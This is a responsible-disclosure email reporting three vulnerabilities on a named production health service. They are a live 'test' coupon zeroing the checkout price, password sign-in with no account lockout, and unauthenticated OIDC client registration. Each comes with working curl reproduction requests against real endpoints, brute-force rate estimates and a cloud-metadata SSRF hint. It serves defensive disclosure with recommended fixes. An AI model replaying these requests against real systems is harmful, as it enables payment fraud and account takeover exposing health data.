Subject: Responsible Disclosure: High vulnerabilities on lucis.life

Dear Lucis Security Team,

During independent security research on lucis.life and its subdomains, I identified three vulnerabilities across the production API and authentication infrastructure. Testing was performed using self-created test accounts only. No real customer data was accessed, modified, or stored beyond what was necessary to confirm each finding. Test purchases were left in pending state and never completed. A small number of test artifacts were created during testing; details follow near the end.


Test coupon code active in production providing 100% discount (High, CVSS 7.5)

Endpoints:
POST https://api.lucis.life/v1/public/codes/validate
POST https://api.lucis.life/v1/public/checkout/calculate

A trivially guessable coupon code "test" is active in the production environment. It provides a fixed discount of 490 EUR, which is the exact price of the Lucis Care annual subscription. When applied through the public checkout calculation flow, the total is reduced to 0 EUR. Both endpoints are unauthenticated, meaning any visitor can discover and apply this coupon. The code is case-sensitive (only lowercase "test" works). The underlying Stripe coupon ID is HjH6tubw. The direct financial impact is 490 EUR per abuse instance.

Reproduction:

Step 1. Validate the coupon code:

curl -X POST https://api.lucis.life/v1/public/codes/validate \
  -H "Content-Type: application/json" \
  -d '{"code":"test"}'

Response:

{"success":true,"data":{"type":"COUPON","originalCode":"test","data":{"id":"HjH6tubw","couponType":"fixed_amount_off","fixedAmountOff":49000,"currency":"eur"},"projectedCoupon":{"id":"HjH6tubw","couponType":"fixed_amount_off","fixedAmountOff":49000,"currency":"eur"},"metadata":{"code_type":"COUPON","code_value":"test","coupon_id":"HjH6tubw","coupon_type":"fixed_amount_off"},"isValid":true,"validOn":[],"appCode":null}}

Step 2. Apply the coupon to a checkout calculation for the Lucis Care subscription:

curl -X POST https://api.lucis.life/v1/public/checkout/calculate \
  -H "Content-Type: application/json" \
  -d '{"currency":"eur","couponCode":"test","basket":{"items":[{"type":"subscription","id":3,"uuid":"bc9a5ff3-6231-4427-b6b3-fb94223f9e95","label":"Lucis Care","quantity":1}]}}'

Response:

{"success":true,"data":{"totalAmountBeforeDiscount":49000,"discountAmount":49000,"totalAmountAfterDiscount":0,"freeItems":[]}}

The total drops from 490 EUR to 0 EUR. In a multi-item basket (subscription plus microbiome addon at 150 EUR), the discount still applies as 490 EUR off, bringing the total from 640 EUR to 150 EUR.

Recommended fix: Immediately deactivate the "test" coupon in Stripe (coupon ID HjH6tubw). Audit all active Stripe coupons for other test or debug codes. Add monitoring and alerting for coupon usage at 100% discount levels.


No account lockout on password authentication, brute force feasible (Medium, CVSS 5.9)

Endpoint: POST https://clerk.lucis.life/v1/client/sign_ins/{sign_in_id}/attempt_first_factor

The Clerk authentication configuration for lucis.life does not enforce account lockout after failed password attempts. An attacker can submit unlimited wrong passwords against any account without the account being locked, suspended, or presented with a CAPTCHA challenge. Per-IP rate limiting exists (HTTP 429), but it is leaky: approximately 54% of rapid-fire requests still get processed. The failed-attempt counter tracked by Clerk resets when a new sign-in attempt is created, meaning an attacker can rotate sign-in sessions to avoid any per-session tracking. After 100+ failed attempts across multiple sessions in testing, the target account remained fully accessible with all authentication methods intact. Given that Lucis stores sensitive health data (biomarkers, lab results, medical profiles), account compromise through brute force carries significant impact. For comparison, the email code verification flow is properly protected and locks after exactly 3 failed attempts.

Reproduction:

Step 1. Create a sign-in attempt:

curl -X POST "https://clerk.lucis.life/v1/client/sign_ins" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "identifier=peter.bjorn75@gmail.com"

Response (HTTP 200): returns sign_in_id and status "needs_first_factor" with password, email_code, email_link strategies available.

Step 2. Submit a wrong password (repeatable without lockout):

curl -X POST "https://clerk.lucis.life/v1/client/sign_ins/sia_3LPPkl6Yljjg0ugnaGaisoQKJy7/attempt_first_factor" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "strategy=password&password=WrongPassword123"

Response (HTTP 422):

{"errors":[{"message":"Password or email address is incorrect. Try again, or use another method.","code":"form_password_or_identifier_incorrect"}],"meta":{"client":{"sign_in":{"status":"needs_first_factor","first_factor_verification":{"status":"unverified","strategy":"password","attempts":42,"expire_at":null}},"captcha_bypass":false}}}

The attempts counter climbs (42 shown here) but the status never changes to "failed" or "locked". The sign-in remains active indefinitely.

Step 3. Batch test: 100 sequential requests in 29 seconds yielded 54 processed (HTTP 422) and 46 rate-limited (HTTP 429). No lockout, no CAPTCHA, no account suspension at any point.

Step 4. Counter reset: creating a new sign-in attempt for the same email resets the attempts counter to 0, giving unlimited fresh sessions.

At approximately 600 passwords per hour from a single IP, or 6,000 per hour with 10 rotating IPs, the top 10,000 common passwords can be exhausted in under 2 hours.

Recommended fix: Enable Clerk's account lockout under "User & Authentication > Attack Protection" in the Clerk dashboard. Enable CAPTCHA (Clerk supports Cloudflare Turnstile and hCaptcha). Add per-account rate limiting that persists across sign-in attempts and IP addresses.


Open OIDC dynamic client registration without authentication (Medium, CVSS 5.3)

Endpoint: POST https://api.lucis.life/oidc/register

The OIDC dynamic client registration endpoint is open to unauthenticated requests. Any anonymous caller can register an arbitrary number of OAuth 2.0 / OIDC clients without authentication or rate limiting. Registered clients persist in the database and cannot be deleted via the API (DELETE returns 404). Registered clients are functional in the authorization flow: visiting the authorize URL with a registered client_id initiates the Lucis sign-in flow. The registration endpoint also accepts metadata URIs (logo_uri, client_uri, sector_identifier_uri) pointing to internal addresses such as 169.254.169.254, which could enable SSRF if the server fetches these during consent page rendering. Server-side mitigations are in place: redirect URIs are restricted to loopback addresses, scope is always downgraded to "openid" only, grant type is forced to "authorization_code" only, and no client_secret is issued.

Reproduction:

Step 1. Discover the endpoint:

curl https://api.lucis.life/.well-known/openid-configuration

Response includes: "registration_endpoint":"https://api.lucis.life/oidc/register"

Step 2. Register a client without authentication:

curl -X POST https://api.lucis.life/oidc/register \
  -H "Content-Type: application/json" \
  -d '{"client_name":"SecurityTest","redirect_uris":["http://localhost:8080/callback"],"grant_types":["authorization_code","client_credentials"],"response_types":["code"],"scope":"openid profile email address"}'

Response (HTTP 201):

{"client_id":"55ed8716-a1e2-4134-91de-135f667111c6","client_id_issued_at":1793301545,"client_name":"SecurityTest","redirect_uris":["http://localhost:8080/callback"],"grant_types":["authorization_code"],"response_types":["code"],"token_endpoint_auth_method":"none","scope":"openid"}

Note that grant_types was downgraded from ["authorization_code","client_credentials"] to ["authorization_code"] only, and scope from "openid profile email address" to "openid" only.

Step 3. Verify the client initiates an authorization flow:

curl -I "https://app.lucis.life/oidc/authorize/?response_type=code&client_id=55ed8716-a1e2-4134-91de-135f667111c6&redirect_uri=http://localhost:8080/callback&scope=openid&state=test123"

Response: HTTP 307 redirect to the Clerk sign-in page.

Step 4. Verify the client cannot be deleted:

curl -X DELETE https://api.lucis.life/oidc/register/55ed8716-a1e2-4134-91de-135f667111c6

Response: HTTP 404 (no delete endpoint available).

Recommended fix: Require authentication (an admin API key or specific OAuth scope) on the registration endpoint. Implement rate limiting on client creation. Add a management API for registered clients. Consider removing the dynamic registration endpoint entirely if it is not needed for the application's use case.


Beyond these three findings, additional items were identified during testing including a credentialed CORS misconfiguration on the CMS subdomain and a server-side configuration schema leak in the client-side JavaScript bundle exposing 129 environment variable definitions with internal infrastructure details, staff email addresses, and staging URLs. I am happy to share the complete report if there is interest.


Test artifacts to clean up:

During testing, the following persistent artifacts were created:

Test accounts (all created via the standard sign-up flow, none completed payment):
- peter.bjorn75@gmail.com (member UUID 9cfa900b-74f7-4356-b62e-5c384a1831bd)
- peter.bjorn75+2@gmail.com (member UUID 29c405c3-ff49-4c67-8ae0-17fed526e4c6, Stripe customer cus_VX2ny0C8DumadA)
- peter.bjorn75+lucis1@gmail.com (member UUID 2ea73a11-c750-4f99-a78f-f484f71eeee7)
- peter.bjorn75+lucis2@gmail.com (member UUID 904904f3-6d36-4735-ab43-0cbeed4494af)

OIDC clients registered (cannot be deleted via API):
- client_id 55ed8716-a1e2-4134-91de-135f667111c6 (SecurityTest)
- Approximately 15 additional test clients with names like MismatchTest, ScopeTest, and XSS payload strings in client_name

All test accounts have status REGISTERED with payments left in PENDING state. Cart and payment records can be safely deleted. All of these can be removed from the database.


I was wondering whether Lucis has a bug bounty policy or program in place. If not, I would welcome a discussion about a reward. Given the direct financial impact of the first finding and the sensitivity of the health data protected by the authentication layer, I believe these findings warrant consideration. I am happy to coordinate disclosure timelines and help verify any fixes.

Let me know if you'd like any additional details or clarification from my side, I'm open to any and all questions.

Kind regards,

Sjoerd
